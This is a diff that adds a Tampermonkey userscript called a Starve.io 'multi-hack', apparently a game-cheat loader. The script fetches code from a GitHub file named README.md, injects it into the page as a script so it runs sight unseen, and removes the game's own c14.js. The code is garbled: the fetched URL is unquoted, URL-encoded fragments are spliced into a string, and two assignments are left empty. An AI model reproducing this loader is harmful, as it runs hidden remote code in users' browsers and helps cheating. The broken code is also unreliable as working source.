@@ -1,0 +1,48 @@
+// ==UserScript==
+// @name         A Starve.io MULTI-HACK
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world!
+// @author       Bubbley
+// @match        ://starve.io/
+// @run-at       document-start
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    const injectInline = (data) => {
+        data = data.replace(new RegExp("\r?\n", "g"), "")
+        data = data.replace(/ +/g, " ");
+        let s = document.createElement('script');
+        s.type = 'text/javascript';
+        s.innerText = data
+        document.getElementsByTagName('body')[0].appendChild(s);
+    };
+
+    const request = url => fetch(url).then(res => res.text());
+
+    (async function() {
+        let script = await request(https://raw.githubusercontent.com/ggScripts123/gg-/main/README.md);
+
+        injectInline(script)
+    })();
+
+    let observer = new MutationObserver(mutations => {
+        for (const mutation of mutations) {
+            for (let node of mutation.addedNodes) {
+                if(node.src && node.src.match('https://starve.io/js/c14.js%27))%7B
+                    node.outerHTML = 
+                    node.innerHTML = ;
+                    node.src='';
+                }
+            }
+        }
+    });
+
+    observer.observe(document, {
+        childList: true,
+        subtree: true
+    })
+})();
